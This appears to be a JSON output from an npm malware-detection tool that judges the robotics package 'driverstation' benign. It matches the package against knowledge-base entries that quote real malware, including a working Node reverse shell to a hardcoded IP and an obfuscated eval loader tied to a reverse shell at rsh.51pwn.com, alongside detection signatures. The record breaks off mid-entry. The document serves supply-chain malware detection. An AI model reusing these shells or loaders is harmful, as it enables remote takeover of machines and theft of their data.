@@ -1,0 +1,537 @@
+{
+  "package_name": "driverstation",
+  "package_version": "0.6.1",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:18:58.211522",
+  "status": "success",
+  "selected_files_count": 5,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/examples/connect.js",
+    "package/lib/driverstation.js",
+    "package/lib/utils.js"
+  ],
+  "is_malicious": false,
+  "total_files": 5,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/driverstation/0.6.1/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/driverstation/0.6.1/package/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/driverstation/0.6.1/package/examples/connect.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/driverstation/0.6.1/package/lib/driverstation.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "driverstation_slice_1",
+          "code_snippet": "var dgram = require('dgram');\nvar crc32 = require('buffer-crc32');\nvar util = require(\"util\");\nvar events = require(\"events\");\nvar utils = require('./utils.js');\n\nvar RESET_BIT = 0x80;\nvar FMS_ATTACHED = 0x08;\nvar RESYNCH = 0x04;\nvar CHECK_VERSIONS_BIT = 0x01;\n\nvar MODES = {\n    'Teleoperated': 0x60,\n    'Autonomous': 0x70,\n    'Disabled': 0x40,\n    'Test': 0x62,\n    'Soft Reboot': 0x80,\n    'Emergency Stopped': 0x00\n};\n\nvar nfsd_keepalive = 1110;\nvar blaze = 1150;\n\nfunction DriverStation() {\n  events.EventEmitter.call(this);\n\n  this.updateInterval = 0.02 * 1000;\n  this.connected = false;\n  this.missedPackets = 0;\n\n  this.client = dgram.createSocket(\"udp4\");\n\n  this.FRCCommonControlData = {\n    packetIndex: 0,\n    control: 0x40,\n    dsDigitalIn: 0xff,\n    teamID: 0x0000,\n    dsID_Alliance: 0x52,\n    dsID_Position: 0x31,\n    joystickAxes: [\n      [null,null,null,null,null,null],\n      [null,null,null,null,null,null],\n      [null,null,null,null,null,null],\n      [null,null,null,null,null,null],\n    ],\n    joystickButtons: [null,null,null,null],\n    analog1: null,\n    analog2: null,\n    analog3: null,\n    analog4: null,\n  };\n\n  this.robotData = null;\n  this.freeMemory = 0;\n}\n\nutil.inherits(DriverStation, events.EventEmitter);\n\nDriverStation.prototype.start = function(options) {\n  this.setTeamID(options.teamID);\n  this.alliance = options.alliance;\n  this.position = options.position;\n};\n\nDriverStation.prototype.setTeamID = function(teamID, callback) {\n  var isValid = utils.validTeamID(teamID);\n\n  if (isValid === true) {\n    this.ip = utils.getTeamIP(teamID);\n    this.FRCCommonControlData.teamID = teamID;\n    if (!this.connected && !this.findTimer) {\n      this.waitForConnection();\n    }\n  } else {\n    this.disconnect();\n  }\n\n  if (callback) {\n    if (isValid !== true) {\n      callback(isValid);\n    } else {\n      callback(null);\n    }\n  }\n};\n\nDriverStation.prototype.waitForConnection = function() {\n  var self = this;\n\n  this.findTimer = setInterval(function() {\n    self.send();\n  }, this.updateInterval * 50);\n\n  this.listen();\n};\n\nDriverStation.prototype.connect = function(callback) {\n  var self = this;\n\n  this.sendTimer = setInterval(function() {\n    self.send();\n    self.missedPackets++;\n  }, this.updateInterval);\n\n  setTimeout(function() {\n    if (!self.connected) {\n      callback(\"No Robot Communication\");\n      self.disconnect();\n    }\n  }, this.updateInterval * 5);\n};\n\nDriverStation.prototype.disconnect = function(callback) {\n  clearInterval(this.sendTimer);\n  clearInterval(this.findTimer);\n  this.connected = false;\n  this.emit('disconnect');\n};\n\nDriverStation.prototype.send = function() {\n  this.FRCCommonControlData.packetIndex++;\n\n  var packet = new Buffer(1024);\n  packet.fill(0x00);\n\n  packet.writeUInt16BE(this.FRCCommonControlData.packetIndex, 0, 2);\n  packet.writeUInt8(this.FRCCommonControlData.control, 2, 1);\n\n  packet.writeUInt8(this.FRCCommonControlData.dsDigitalIn, 3, 1);\n  packet.writeUInt16BE(this.FRCCommonControlData.teamID, 4, 2);\n\n  packet.writeUInt8(this.FRCCommonControlData.dsID_Alliance, 6, 1);\n  packet.writeUInt8(this.FRCCommonControlData.dsID_Position, 7, 1);\n\n  for(var i = 0; i < 4; i++) {\n    for(var j = 0; j < 6; j++) {\n      packet.writeInt8(this.FRCCommonControlData.joystickAxes[i][j],(8+j)+(i*8),1);\n    }\n    packet.writeUInt16BE(this.FRCCommonControlData.joystickButtons[i],14+(i*8),2);\n  }\n\n  packet.writeUInt16BE(this.FRCCommonControlData.analog1, 40, 2);\n  packet.writeUInt16BE(this.FRCCommonControlData.analog2, 42, 2);\n  packet.writeUInt16BE(this.FRCCommonControlData.analog3, 44, 2);\n  packet.writeUInt16BE(this.FRCCommonControlData.analog4, 46, 2);\n\n  var crc = crc32(packet);\n  crc.copy(packet, packet.length-4);\n\n  this.client.send(packet, 0, packet.length, nfsd_keepalive, this.ip, function(err, bytes) {\n    if (err) console.error(err);\n  });\n\n  this.disconnectCheck();\n};\n\nDriverStation.prototype.listen = function() {\n  var self = this;\n\n  var server = dgram.createSocket(\"udp4\");\n\n  server.on(\"message\", function (msg, rinfo) {\n    if (self.findTimer) {\n      clearInterval(self.findTimer);\n      self.findTimer = null;\n\n      self.connect();\n      self.emit(\"connect\");\n    }\n\n    self.connected = true;\n    self.emit(\"robotData\", self.parseRobotData(msg));\n    self.missedPackets = 0;\n  });\n\n  server.bind(blaze);\n};\n\nDriverStation.prototype.parseRobotData = function(robotData) {\n  var control = robotData.readUInt8(0);\n  var batteryVolts = robotData.toString('hex', 1, 2) + \".\" + robotData.toString('hex', 2, 3);\n  var dsDigitalOut = robotData.readUInt8(3);\n  var teamID = robotData.readUInt16BE(8);\n  var macAddress = robotData.toString('hex', 10, 16);\n  var packetIndex = robotData.readUInt16BE(30);\n\n  var updateNumber = robotData.readUInt8(32);\n\n  var userDataHighLength = robotData.readInt32BE(33);\n  var userDataHigh_start = 33 + 4;\n  var userDataHigh_end = userDataHigh_start + userDataHighLength;\n  var userDataHigh = robotData.slice(userDataHigh_start, userDataHigh_end);\n\n  var errorDataLength = robotData.readInt32BE(userDataHigh_end);\n  var errorData_start = userDataHigh_end + 4;\n  var errorData_end = errorData_start + errorDataLength;\n  var errorData = robotData.slice(errorData_start, errorData_end);\n\n  var userDataLowLength = robotData.readInt32BE(errorData_end);\n  var userDataLow_start = errorData_end + 4;\n  var userDataLow_end = userDataLow_start + userDataLowLength;\n  var userDataLow = robotData.slice(userDataLow_start, userDataLow_end);\n\n  var userDsLcdData = robotData.slice(1026, 1152);\n\n  var freeMem = robotData.readUInt8(953);\n\n  var robotCode = (freeMem <= this.freeMemory);\n\n  return {\n    'control': control,\n    'batteryVolts': batteryVolts,\n    'dsDigitalOut': dsDigitalOut,\n    'teamID': teamID,\n    'robotCode': robotCode,\n    'freeMemory': freeMem,\n    'macAddress': macAddress,\n    'packetIndex': packetIndex,\n    'updateNumber': updateNumber,\n    'userDataHighLength': userDataHighLength,\n    'userDataHigh': userDataHigh,\n    'errorDataLength': errorDataLength,\n    'errorData': errorData.toString('ascii'),\n    'userDataLowLength': userDataLowLength,\n    'userDataLow': userDataLow,\n    'userDsLcdData': userDsLcdData.toString('ascii')\n  };\n};\n\nDriverStation.prototype.disconnectCheck = function() {\n  if (this.missedPackets > 10) {\n    this.disconnect();\n    this.missedPackets = 0;\n\n    this.waitForConnection();\n  }\n};\n\nDriverStation.prototype.enable = function(mode) {\n  var mode_bits = MODES[mode];\n  if (!mode_bits) {\n    console.error('Unknown Mode: ' + mode);\n    return;\n  }\n\n  this.FRCCommonControlData.control = mode_bits;\n};\n\nDriverStation.prototype.disable = function() {\n  this.FRCCommonControlData.control = MODES['Disabled'];\n};\n\nDriverStation.prototype.estop = function() {\n  this.FRCCommonControlData.control = MODES['Emergency Stopped'];\n};\n\nDriverStation.prototype.reboot = function() {\n  this.FRCCommonControlData.control = MODES['Soft Reboot'];\n};\n\nmodule.exports = new DriverStation();",
+          "is_malicious": false,
+          "malice_score": 0.46443725228309635,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code constructs and sends UDP packets using the dgram socket API to a dynamically determined IP address derived from a team ID, with hardcoded UDP ports 1110 and 1150 used for sending and listening respectively. It accesses and modifies internal control data including mode bits and joystick inputs, and listens for incoming UDP packets to receive robot data, parsing it for control and status information. This facilitates remote control and monitoring of a robot over the network, enabling real-time command and telemetry exchange via hardcoded UDP ports, which could be leveraged for unauthorized control or data interception if misused.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code implements a UDP-based communication protocol for remote control and telemetry exchange with a robot, using well-known Node.js APIs (dgram, events, util) and structured data packets. It dynamically determines the target IP based on a team ID and uses fixed UDP ports for sending and receiving data. While it enables remote control and monitoring, this behavior aligns with legitimate robotics control software rather than malware. There is no evidence of obfuscation, code injection, shell command execution, or unauthorized data exfiltration. The code does not open a remote shell, execute arbitrary commands, or manipulate system files. The known malicious patterns involve remote shell servers, obfuscated payload execution, or unauthorized vehicle control with weak authentication, none of which are present here. The use of UDP sockets and packet parsing is typical for real-time control systems and not inherently malicious. Therefore, despite some superficial similarity to remote control malware, this code is benign in context.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_205442_500638_snippet_2",
+              "source_package": "nodejs_net_server (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205442_500638/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4736859202384949,
+              "code_similarity": 0.38129663467407227,
+              "behavior_similarity": 0.5660752058029175,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode based on report description\nconst net = require('net');\nconst server = net.createServer((socket) => {\n  // Accepts remote shell commands, file operations, etc.\n});\nserver.listen(port, ip);",
+                "code_behavior": "At runtime, the code starts a TCP socket server that listens for remote connections, receives and executes shell commands, performs file operations, and allows file uploads, enabling remote control of the victim's system.",
+                "malice_analysis": {
+                  "why_suspicious": "Opening a remote shell and exposing file operations over a network socket without authentication is highly dangerous and not expected in a typical npm package.",
+                  "violated_expectations": "Normal packages should not expose remote shell access or arbitrary file operations without explicit user configuration, authentication, and security controls.",
+                  "similar_legitimate_use": "Some legitimate remote administration tools or development servers may expose similar functionality, but always with authentication, user awareness, and clear documentation.",
+                  "key_indicators": [
+                    "Socket server accepting remote commands",
+                    "Shell command execution capability",
+                    "File upload and manipulation features",
+                    "No authentication or access control"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when package is used)",
+                  "file_location": "lib/test.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "nodejs_net_server",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0 - 1.1.2",
+                  "why_malicious": "The package includes and/or downloads a Windows executable (a.exe, ChromePass) that extracts Chrome browser passwords, exposes a remote shell and file operation server without authentication, and hijacks the 'jstest' command via the bin field. These behaviors enable credential theft, remote system compromise, and command hijacking, posing severe security risks. The inclusion of credential-stealing tools and remote control features in a public npm package is highly suspicious and dangerous, regardless of the author's stated intent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Package is installed, and the 'bin' field in package.json creates or overwrites the 'jstest' command in the user's environment.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "User or system may execute the malicious 'jstest' command, leading to further code execution under the attacker's control."
+                  },
+                  {
+                    "step": 2,
+                    "action": "During install or runtime, the package downloads the ChromePass executable (a.exe) from a remote server (chrunlee.cn) and saves it locally.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious binary (a.exe) is present on the system and ready for execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The package exposes a remote shell and file operation server, allowing remote attackers to connect and issue commands, including execution of downloaded binaries.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker can remotely control the victim's system, execute arbitrary commands, and run the credential-stealing binary."
+                  },
+                  {
+                    "step": 4,
+                    "action": "The ChromePass binary (a.exe) is executed, extracting all Chrome browser passwords from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credentials are stolen and can be exfiltrated by the attacker, resulting in compromise of sensitive user data."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Inclusion or download of credential-stealing binaries (e.g., ChromePass) in npm packages",
+                    "Socket servers exposing unauthenticated remote shell or file operations",
+                    "Hijacking of common CLI commands via the bin field in package.json",
+                    "Downloading executables from non-official domains (e.g., chrunlee.cn) during install or runtime",
+                    "Execution of Windows binaries from within a Node.js package"
+                  ],
+                  "file_indicators": [
+                    "package/lib/a.exe",
+                    "Downloaded a.exe in package directory",
+                    "package.json with bin field defining 'jstest'",
+                    "lib/test.js implementing a TCP server"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to chrunlee.cn or similar non-official domains",
+                    "Unusual TCP socket connections initiated by nodejs_net_server",
+                    "Inbound connections to TCP server started by the package"
+                  ],
+                  "how_to_detect": "Monitor npm packages for inclusion of suspicious binaries such as ChromePass, analyze package.json for bin field hijacking common command names, and flag packages that download executables from untrusted domains like chrunlee.cn. Use static and dynamic analysis to identify code that downloads or executes binaries, starts unauthenticated socket servers, or exposes remote shell/file operations. Monitor for unexpected network activity to suspicious domains and for inbound connections to local TCP servers started by the package. Correlate these behaviors to identify malicious packages."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.47007307410240173,
+              "code_similarity": 0.4829264283180237,
+              "behavior_similarity": 0.4572197198867798,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104205_631636_snippet_1",
+              "source_package": "Multiple Connected Car Software Components (Various (proprietary, open-source, third-party))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104205_631636/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4532405138015747,
+              "code_similarity": 0.3630774915218353,
+              "behavior_similarity": 0.5434035658836365,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representing remote command execution vulnerability\nif (receive_remote_command()) {\n    execute_vehicle_control(command);\n}",
+                "code_behavior": "At runtime, the code receives remote commands over the internet, directly maps network input to vehicle control functions, and executes these commands on vehicle control systems, resulting in unauthorized remote manipulation of physical vehicle operations such as unlocking doors, starting the engine, or controlling steering and braking.",
+                "malice_analysis": {
+                  "why_suspicious": "The code enables remote execution of critical vehicle controls based on network input, without robust authentication or authorization, which can allow attackers to take physical control of the vehicle remotely.",
+                  "violated_expectations": "Normal vehicle software should strictly restrict remote access to control systems, requiring strong authentication, authorization, and encrypted channels. This code bypasses or weakens these controls, allowing arbitrary or weakly authenticated remote commands to be executed.",
+                  "similar_legitimate_use": "Remote start or lock/unlock features, but only when implemented with strong authentication, encrypted communication, and strict access controls.",
+                  "key_indicators": [
+                    "Remote command execution mapped to vehicle control functions",
+                    "Weak or missing authentication/authorization checks on network input",
+                    "Direct invocation of vehicle control APIs from internet-facing interfaces",
+                    "Absence of input validation or access control for remote commands"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (remote command execution via internet-connected component)",
+                  "file_location": "Vulnerable proprietary or third-party component (e.g., infotainment, ADAS, telematics)",
+                  "required_permissions": [
+                    "network",
+                    "vehicle control systems",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Multiple Connected Car Software Components",
+                  "package_manager": "Various (proprietary, open-source, third-party)",
+                  "package_versions": "Multiple, including legacy and current versions (notably, some >10 years old)",
+                  "why_malicious": "The risk arises from insecure or outdated software components, vulnerable open-source libraries, and the potential for malicious or compromised code to be introduced via the software supply chain. The interconnected nature of vehicle systems and their internet connectivity create opportunities for attackers to remotely execute arbitrary commands, exfiltrate data, or even take physical control of vehicles."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker identifies a vulnerable or outdated software component in the vehicle's connected system (e.g., via internet-exposed interface or OTA update mechanism).",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Gaining initial access or information disclosure."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker exploits the vulnerability to gain remote access or escalate privileges within the vehicle's software environment.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Ability to send arbitrary commands to vehicle systems."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker leverages insecure OTA update process to install persistent malicious code or further compromise vehicle systems.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Full compromise of vehicle control and/or data exfiltration."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Remote command execution on vehicle control systems from internet-facing interfaces without strong authentication",
+                    "OTA updates installed without cryptographic signature verification or with signature verification bypassed",
+                    "Use of outdated libraries with known critical CVEs (e.g., Heartbleed CVE-2014-0160, Dirty COW CVE-2016-5195, Spectre CVE-2017-5753/CVE-2017-5715)"
+                  ],
+                  "file_indicators": [
+                    "Presence of legacy or unpatched open-source components (e.g., OpenSSL <1.0.1g, Linux kernel <4.8.3) in firmware or system images",
+                    "OTA update logs or audit trails showing installation of unsigned or unverified packages",
+                    "Unusual or unauthorized modifications to vehicle control software binaries or configuration files"
+                  ],
+                  "network_indicators": [
+                    "Unusual inbound connections to vehicle telematics or infotainment systems from external IPs",
+                    "Outbound connections to untrusted or unexpected domains or IP addresses during OTA updates",
+                    "Patterns of data exfiltration, such as large memory dumps or credential data sent externally during or after remote command execution"
+                  ],
+                  "how_to_detect": "Continuously monitor for remote command execution attempts on vehicle systems, enforce and audit cryptographic signature checks on all OTA updates, and regularly scan firmware and software components for outdated or vulnerable libraries using SBOMs and vulnerability databases. Analyze network traffic for suspicious inbound connections to vehicle systems and outbound connections to untrusted domains, especially during update windows or when vehicle controls are accessed remotely. Correlate file system changes and update logs to detect unauthorized software modifications."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_787787_snippet_1",
+              "source_package": "plutov-slack-client (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_787787/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4530651569366455,
+              "code_similarity": 0.40671420097351074,
+              "behavior_similarity": 0.49941614270210266,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "function node_payload() {\n  var require = global.require || global.process.mainModule.constructor._load;\n  if (!require) return;\n  var cmd = (global.process.platform.match(/^win/)) ? \"cmd\" : \"/bin/sh\";\n  var net = require(\"net\"), cp = require(\"child_process\"), util = require(\"util\"), sh = cp.spawn(cmd, []);\n  var client = this;\n  var counter = 0;\n  function StagerRepeat() {\n    client.socket = net.connect(1111, \"50.x.x.x\", function () {\n      client.socket.pipe(sh.stdin);\n      if (typeof util.pump === \"undefined\") {\n        sh.stdout.pipe(client.socket);\n        sh.stderr.pipe(client.socket);\n      } else {\n        util.pump(sh.stdout, client.socket);\n        util.pump(sh.stderr, client.socket);\n      }\n    });\n    socket.on(\"error\", function (error) {\n      counter++;\n      if (counter <= 10) {\n        setTimeout(function () {\n          StagerRepeat();\n        }, 5 * 1000);\n      } else process.exit();\n    });\n  }\n  StagerRepeat();\n}\nconsole.log(\"\");\nnode_payload();",
+                "code_behavior": "At import-time or runtime, the code spawns a system shell process and establishes a persistent TCP connection to a hardcoded remote server, piping shell input and output through the network socket, resulting in a reverse shell that enables remote command execution by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code automatically spawns a shell and connects to a hardcoded external IP and port, then pipes shell input/output over the network. This is a textbook reverse shell technique, commonly used by attackers to gain remote control of compromised systems.",
+                  "violated_expectations": "Legitimate npm packages should not spawn system shells or open outbound network connections to hardcoded IP addresses without explicit user action and clear documentation. Such behavior is highly abnormal and dangerous in general-purpose packages.",
+                  "similar_legitimate_use": "Remote administration tools or debugging utilities may use similar patterns, but only with explicit user consent, secure authentication, and transparent documentation. In this case, there is no user interaction or disclosure.",
+                  "key_indicators": [
+                    "Spawning a shell process (cmd or /bin/sh) via child_process.spawn",
+                    "Connecting to a hardcoded remote IP address (e.g., 50.x.x.x) and port (1111)",
+                    "Piping shell standard input/output to a network socket",
+                    "Retry logic for persistent connection attempts to the attacker's server",
+                    "Use of global.require or process.mainModule.constructor._load to evade static analysis"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or runtime",
+                  "file_location": "main module (e.g., index.js or main entrypoint)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "plutov-slack-client",
+                  "package_manager": "npm",
+                  "package_versions": "all versions prior to removal",
+                  "why_malicious": "Contains code that, upon import or execution, establishes a reverse shell to a hardcoded remote attacker-controlled server, granting the attacker unauthorized remote access to the victim's machine for arbitrary command execution."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious package.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malicious code executes automatically upon installation or import."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at import-time or runtime.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "System compromise or data exfiltration depending on the package."
+                  },
+                  {
+                    "step": 3,
+                    "action": "For plutov-slack-client, nodetest199, nodetest1010: Establishes a reverse shell to the attacker's server, granting remote access.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker can execute arbitrary commands on the victim's machine via the reverse shell."
+                  },
+                  {
+                    "step": 4,
+                    "action": "For npmpubman: Collects all environment variables and exfiltrates them to a remote server.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives sensitive environment data for reconnaissance or further attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
